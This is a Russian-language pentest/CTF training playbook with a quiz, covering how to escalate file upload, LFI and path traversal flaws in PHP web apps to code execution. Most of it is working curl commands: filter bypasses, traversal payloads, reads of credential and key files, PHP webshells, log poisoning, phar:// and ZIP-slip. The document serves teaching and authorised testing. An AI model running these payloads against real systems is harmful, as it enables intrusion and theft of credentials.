---
id: web-playbook-file-to-rce
title: "Плейбук: от файлового примитива до RCE"
category: web
parent: web-playbooks-exploit
difficulty: hard
order: 2
tags: [playbook, file-upload, lfi, traversal, rce, webshell, wrappers, decision-tree, web]
prerequisites: [web-file-upload, web-lfi-path-traversal, web-playbook-recon-to-foothold]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "Decision-tree: загрузка файла / LFI / traversal → обход фильтров → чтение файлов → путь к исполнению кода (webshell, log poisoning, /proc, wrappers, phar)."
---

Вы нашли файловый примитив: форма загрузки, параметр `?file=`/`?page=`, или ответ, в котором эхом отдаётся содержимое файла. Вопрос — **как из «читаю файлы» получить исполнение кода**. Этот плейбук — дерево от определения примитива до webshell: обход фильтров, чтение конфигов с кредами, затем точки исполнения (log poisoning, `/proc`, PHP wrappers, `phar://`, session-файлы).

## Дерево решения (общая карта)

```
[файловый примитив]
   │
   ├─(1) ОПРЕДЕЛИТЬ, ЧТО ЭТО
   │      ├─ загрузка файла (multipart) ──────► (2) upload bypass
   │      ├─ чтение по пути (?file=/page=) ───► (3) LFI/traversal
   │      ├─ распаковка архива (zip/tar) ─────► ZIP-slip / phar
   │      └─ десериализация blob ─────────────► web-deserialization
   │
   ├─(2) UPLOAD BYPASS: тип/расширение/магия/двойное расширение
   │      │
   │      ├─ прошёл и исполнился ──► [RCE]
   │      └─ прошёл, но не исполняется ──► (5) где лежит и что запускает
   │
   ├─(3) LFI/TRAVERSAL: прочитать файлы
   │      │
   │      ├─ /etc/passwd виден ──► (4) искать точку исполнения
   │      └─ фильтр режет ../ ──► обходы, wrappers
   │
   ├─(4) ТОЧКА ИСПОЛНЕНИЯ
   │      ├─ log poisoning (Apache/nginx access.log)
   │      ├─ /proc/self/environ | /proc/self/cmdline
   │      ├─ PHP wrappers (php://filter, data://, expect://)
   │      ├─ phar:// deserialization
   │      ├─ session-файл (/tmp/sess_<id>)
   │      └─ upload + LFI = включить загруженный файл
   │
   └─(5) ГДЕ ИСПОЛНЯЕТСЯ
          │
          └─► [webshell / код / доступ]
```

## Шаг 1. Определить примитив

Не путайте три разные вещи: **upload** (файл попадает на сервер), **LFI** (сервер отдаёт содержимое файла), **traversal** (можно выйти за пределы каталога). От этого зависит весь дальнейший маршрут.

```bash
# Upload? Ищем формы с multipart
curl -s https://target.tld | grep -iE '<form|enctype|type="file"'

# LFI/traversal? Параметры, называющие файл
for p in file page path template lang view include download doc img; do
  curl -s -o /dev/null -w "$p=%{http_code} %{size_download}\n" \
    "https://target.tld/index?$p=../../../../etc/passwd"
done

# Отдаёт ли содержимое файла
curl -s 'https://target.tld/index?page=../../../../etc/passwd' | grep -m1 'root:x:0:0'
```

**Условие ветвления:** видите `root:x:0:0` → LFI подтверждён, идите в (3)→(4). Форма загрузки принимает файл → (2). Оба есть одновременно — комбо сильнее всего: загрузить + включить.

## Шаг 2. Upload bypass: как протащить исполняемый файл

Фильтры бывают на расширение, MIME, магию и на содержимое. Обходите их слоями.

```bash
# 1) Базовый тест: что вообще принимается
echo '<?php echo "PWNED"; ?>' > test.php
curl -s -F 'file=@test.php;type=application/x-php' https://target.tld/upload -i | head

# 2) Двойное расширение / альтернативные расширения
for ext in php php3 php4 php5 phtml pht phps php7 php8 inc; do
  cp test.php "test.$ext"
  curl -s -o /dev/null -w "$ext -> %{http_code}\n" -F "file=@test.$ext" https://target.tld/upload
done

# 3) Обход по MIME: подменить Content-Type
curl -s -F 'file=@test.php;type=image/png' https://target.tld/upload

# 4) Обход по магии: начать файл с GIF89a
printf 'GIF89a;<?php echo "PWNED"; ?>' > shell.gif.php
curl -s -F 'file=@shell.gif.php;type=image/gif' https://target.tld/upload

# 5) Null-byte / trailing dot / пробел (старые стеки)
curl -s -F 'file=@test.php;filename=test.php%00.jpg' https://target.tld/upload
curl -s -F 'file=@test.php;filename=test.php.' https://target.tld/upload

# 6) .htaccess, если Apache и разрешён
printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
curl -s -F 'file=@.htaccess' https://target.tld/upload   # затем грузим shell.jpg
```

**Условие ветвления:** файл принят и доступен по URL → пробуйте выполнить (`curl https://target.tld/uploads/shell.php`). Не исполняется → ищите точку исполнения (5). Отклоняется → комбинируйте обходы: имя + MIME + магия + `.htaccess`/`web.config`.

**Осторожно:** загрузка webshell меняет состояние цели. Пишите в новые файлы, не перезаписывайте существующие; на продакшене согласуйте с владельцем.

## Шаг 3. LFI/traversal: читать файлы

Цель — сначала прочитать, что нужно: конфиги с кредами, ключи, исходники.

```bash
# Обходы фильтров фильтрации пути
payloads=("../../../../etc/passwd" "....//....//....//etc/passwd" "..%2f..%2f..%2fetc/passwd"
          "..%252f..%252f..%252fetc/passwd" "/etc/passwd" "%2fetc%2fpasswd" "....\/....\/etc/passwd")
for p in "${payloads[@]}"; do
  echo "== $p"
  curl -s --get --data-urlencode "page=$p" https://target.tld/index | grep -m1 'root:x:0:0'
done

# Windows-цели
curl -s 'https://target.tld/index?page=..\..\..\windows\win.ini' | grep -m1 '\[fonts\]'

# Что читать в первую очередь
#   Linux: /etc/passwd /etc/shadow /proc/self/environ /proc/self/cmdline
#          /var/www/html/.env /var/www/html/config.php /home/*/.ssh/id_rsa
#   Windows: C:\Windows\win.ini, web.config, C:\inetpub\...
```

**Условие ветвления:** читается `/etc/passwd` → идите за конфигами (`.env`, `config.php` — там креды БД/API). Читается `/proc/self/environ` → возможен log poisoning / RCE. Ничего не читается → обходите фильтр (encoding, абсолютный путь, `php://filter`).

## Шаг 4. Точка исполнения: от чтения к коду

Это ядро плейбука. Чтение файлов — ещё не RCE; нужен канал, который **исполнит** ваш код.

```bash
# --- 4.1 PHP wrappers (если язык PHP) ---
# Читать исходник в base64 (обход выполнения/фильтра)
curl -s 'https://target.tld/index?page=php://filter/convert.base64-encode/resource=index.php'
# Выполнить код из data:// (требует allow_url_include=On)
curl -s --get --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+' \
  'https://target.tld/index?c=id'
# expect:// (редко, но сразу RCE)
curl -s --get --data-urlencode 'page=expect://id' https://target.tld/index

# --- 4.2 Log poisoning (Apache/nginx) ---
# Вредоносный UA попадает в access.log, затем включаем лог через LFI
curl -s -A '<?php system($_GET["c"]); ?>' https://target.tld/ -o /dev/null
curl -s 'https://target.tld/index?page=/var/log/apache2/access.log&c=id'
curl -s 'https://target.tld/index?page=/var/log/nginx/access.log&c=id'
#   обход лога nginx: параметр в query-строке тоже логируется
curl -s 'https://target.tld/?a=<?php system($_GET["c"]); ?>' -o /dev/null

# --- 4.3 /proc/self/environ ---
curl -s -A '<?php system($_GET["c"]); ?>' https://target.tld/ -o /dev/null
curl -s 'https://target.tld/index?page=/proc/self/environ&c=id'

# --- 4.4 Session file ---
# PHP-сессия лежит в /tmp/sess_<PHPSESSID>; записываем код в сессию, включаем файл
curl -s -b "PHPSESSID=abcdef" -d 'name=<?php system($_GET["c"]); ?>' https://target.tld/profile
curl -s 'https://target.tld/index?page=/tmp/sess_abcdef&c=id'

# --- 4.5 phar:// deserialization ---
# Загружаем валидный phar-архив, включаем его как phar:// — сработает десериализация метаданных
php -d phar.readonly=0 -f make_phar.php
curl -s 'https://target.tld/index?page=phar:///var/www/html/uploads/evil.phar/x'
```

**Условие ветвления:** любой из каналов вернул вывод `id` → у вас RCE. Немедленно стабилизируйте доступ (обратный шелл/туннель), а не «стреляйте» по одному запросу многократно.

## Шаг 5. Где исполняется загруженный файл

Файл может лежать в `uploads/` без исполнения. Тогда либо ищем каталог, который интерпретируется, либо комбинируем upload + LFI.

```bash
# Куда попал файл — смотрим Location/ответ загрузки и пробуем стандартные пути
for p in /uploads/shell.php /files/shell.php /images/shell.php /static/shell.php \
         /tmp/shell.php /media/shell.php /assets/shell.php; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://target.tld$p"
done

# Проверка исполнения (не просто отдача исходника)
curl -s https://target.tld/uploads/shell.php?c=id

# Комбо: загрузили картинку-с-кодом -> включаем через LFI
curl -s 'https://target.tld/index?page=/var/www/html/uploads/shell.gif.php&c=id'

# ZIP-slip: архив с ../ распаковывается в webroot
printf '@<?php system($_GET["c"]); ?>\n' > shell.php
zip --symlinks evil.zip shell.php
curl -s -F 'archive=@evil.zip' https://target.tld/extract
```

**Условие ветвления:** файл исполняется → RCE. Не исполняется, но есть LFI → включайте его через LFI. Нет ни того, ни другого → ищите другой канал (log poisoning, wrappers) или другую цель.

## Если не сработало — пробуй это

- **Фильтр режет `../`.** Абсолютный путь (`/etc/passwd`), двойное кодирование (`..%252f`), `....//`, `php://filter` с base64, обрезка расширения (`.php` приклеен → `?page=/etc/passwd%00`).
- **Файл не исполняется.** Проверьте, не отдаётся ли как `text/plain`; смените расширение под конкретный стек (`.phtml`, `.php5`, `.phar`); используйте `.htaccess`/`web.config`.
- **Обход по MIME не проходит.** Комбинируйте: правдоподобное имя + `image/png` + магия `GIF89a` + код после магии.
- **Нет логов в известном пути.** Ищите реальный путь логов через LFI (`/etc/nginx/nginx.conf`, `/etc/apache2/envvars`), либо используйте другой канал (session, `/proc`).
- **Blob/base64 в cookie/параметре.** Это десериализация, не LFI — идите в `web-deserialization`/`web-java-deser-chains`.
- **Архив с traversal.** Смотрите `web-zip-slip` и `web-zip-slip`-ветку: распаковка `../` в webroot даёт запись webshell.

## Тупики (dead ends)

- Грузить один и тот же `shell.php` снова и снова, когда фильтр по расширению — обходите имя, а не повторяйте.
- Искать исполнение в `uploads/`, который смонтирован как static/`noexec` — там его не будет; нужен LFI-включение или другой каталог.
- `data://`/`expect://` без `allow_url_include` — не сработают; проверьте `php://filter` для чтения исходников.
- Логировать в файл, который вы не можете прочитать (нет LFI на нужный путь) — сначала найдите путь логов.
- Перезаписывать существующие файлы при загрузке — можно сломать приложение (и это разрушительно).

## Квиз

```quiz
- question: "Параметр page=../../../../etc/passwd вернул root:x:0:0. Что это подтверждает?"
  options:
    - "RCE"
    - "LFI / path traversal — чтение произвольных файлов"
    - "SQLi"
    - "SSRF"
  answer: 1
  explanation: "Чтение файла по относительному пути за пределы каталога — это LFI/traversal, ещё не RCE."
- question: "Что из перечисленного даёт ИСПОЛНЕНИЕ кода, а не только чтение файла?"
  options:
    - "php://filter/convert.base64-encode"
    - "expect://id или data:// с кодом (при allow_url_include)"
    - "/etc/passwd"
    - "robots.txt"
  answer: 1
  explanation: "expect:// и data:// могут исполнить код; php://filter лишь кодирует содержимое."
- question: "Как протащить PHP-код через фильтр по расширению и MIME?"
  options:
    - "Просто повторить shell.php"
    - "Комбинация: имя .gif.php + Content-Type image/gif + магия GIF89a + код после неё"
    - "Отправить пустой файл"
    - "Сменить браузер"
  answer: 1
  explanation: "Обходы комбинируют: двойное расширение, подмена MIME и magic bytes."
- question: "Зачем класть PHP-код в User-Agent?"
  options:
    - "Чтобы ускорить сервер"
    - "Для log poisoning — код попадёт в access.log, который затем включается через LFI"
    - "Чтобы скрыть IP"
    - "Для CSRF"
  answer: 1
  explanation: "Лог-отравление: вредоносный UA попадает в лог, а LFI его исполняет."
- question: "Загруженный файл доступен по URL, но отдаётся как текст. Что делать?"
  options:
    - "Сдаться"
    - "Найти каталог с исполнением, сменить расширение под стек или включить файл через LFI"
    - "Перезапустить сервер"
    - "Отправить ещё раз тот же файл"
  answer: 1
  explanation: "Если каталог не исполняет файлы — ищут другой каталог, другое расширение или LFI-включение."
```

## Где пригодится

- **CTF (Web):** типовой маршрут upload/LFI → RCE, самый частый источник флагов.
- **Bug bounty:** корректная цепочка «примитив → чтение → исполнение» с доказательством.
- **Пентест:** демонстрация реального воздействия файловых уязвимостей.
- **Работа (AppSec):** понимание, почему валидация загрузок и изоляция каталогов критичны.
